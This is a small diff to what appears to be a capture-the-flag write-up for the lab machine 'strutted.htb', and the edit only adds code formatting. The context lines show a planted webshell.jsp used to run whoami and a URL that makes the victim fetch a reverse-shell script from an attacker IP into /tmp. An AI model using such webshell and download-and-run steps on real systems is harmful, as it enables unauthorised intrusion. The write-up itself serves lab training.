@@ -278,7 +278,7 @@ Once uploaded, we `run` a `whoami`:
 
 Perfect!! We can `execute` commands in the system, let's gain `access` with a `Reverse Shell`.
 
-To do it, firt we create a "reverse.sh" file and put it in the /tmp path of the victim system with curl:
+To do it, firt we create a `"reverse.sh"` file and put it in the `/tmp` path of the victim system with `curl`:
 
 -> `http://strutted.htb/webshell.jsp?action=cmd&cmd=curl%2010.10.14.22/reverse.sh%20-o%20/tmp/reverse.sh`
 
